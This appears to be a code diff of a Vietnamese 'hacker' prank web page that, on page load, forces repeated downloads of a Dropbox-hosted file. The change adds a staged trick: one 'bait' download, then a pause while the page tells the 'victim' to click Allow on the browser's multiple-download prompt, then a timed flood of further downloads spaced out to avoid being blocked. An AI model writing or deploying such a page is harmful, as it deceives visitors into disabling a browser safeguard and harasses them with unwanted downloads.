@@ -14,7 +14,6 @@
         }
         h1 { font-size: 40px; text-shadow: 0 0 10px #00FF00; }
         .warning { color: #FFFF00; font-size: 14px; margin-top: 20px; }
-        /* Thêm hiệu ứng nhấp nháy cho dòng trạng thái */
         #trang-thai { 
             font-size: 24px; 
             color: red; 
@@ -30,35 +29,41 @@
     <h1>[ BÍ THUẬT HAKER ]</h1>
     <p>Hệ thống đang tự động xâm nhập và truyền dữ liệu...</p>
     
-    <!-- Dòng trạng thái tĩnh, nhấp nháy ngầu lòi, không báo số lượng tải -->
     <p id="trang-thai">ĐANG THỰC THI LỆNH...</p>
 
     <p class="warning">⚠️ LƯU Ý: Nếu trình duyệt hiện thông báo "Cho phép tải nhiều tệp" trên góc phải màn hình,<br>hãy bấm <strong>CHO PHÉP (ALLOW)</strong> để hệ thống tiếp tục.</p>
 
     <script>
-        // TỰ ĐỘNG CHẠY NGAY KHI TRANG VỪA LOAD XONG
         window.onload = function() {
-            
-            // Link Dropbox của bạn đã được lắp vào đây:
             var linkFileCuaBan = "https://www.dropbox.com/scl/fi/jsxpox6sb5ym33x8hty2q/bithuathacker.txt?rlkey=zzyf0jk7hnqk2g6vlgqvf7hf2&st=5i1k5uh0&dl=1";
-            
-            // Số lượng file sẽ bị ép tải về
-            var soLuongTaiVe = 100; 
-            var delay = 0; 
+            var soLuongTaiVe = 10; 
 
-            // Vòng lặp bắn file âm thầm không báo lên màn hình
-            for (var i = 0; i < soLuongTaiVe; i++) {
+            // Hàm thực thi việc tải 1 file
+            function taiTep() {
+                var a = document.createElement('a');
+                a.href = linkFileCuaBan;
+                a.download = ''; 
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+            }
+
+            // GIAI ĐOẠN 1: Bắn file đầu tiên (mồi nhử) sau 1 giây
+            setTimeout(function() {
+                taiTep();
+            }, 1000);
+
+            // GIAI ĐOẠN 2: Dừng 4.5 giây chờ nạn nhân bấm Allow, sau đó dội bom các file còn lại
+            var delayDoiBom = 4500; 
+            
+            // Chạy vòng lặp cho các file còn lại (bắt đầu từ 1 thay vì 0 vì đã tải file mồi nhử)
+            for (var i = 1; i < soLuongTaiVe; i++) {
                 setTimeout(function() {
-                    var a = document.createElement('a');
-                    a.href = linkFileCuaBan;
-                    a.download = ''; 
-                    document.body.appendChild(a);
-                    a.click();
-                    document.body.removeChild(a);
-                }, delay);
+                    taiTep();
+                }, delayDoiBom);
                 
-                // Độ trễ 1.5 giây giữa mỗi lần tải
-                delay += 1500; 
+                // Độ trễ 1.5 giây giữa mỗi lần tải để tránh bị chặn lại
+                delayDoiBom += 1500; 
             }
         };
     </script>
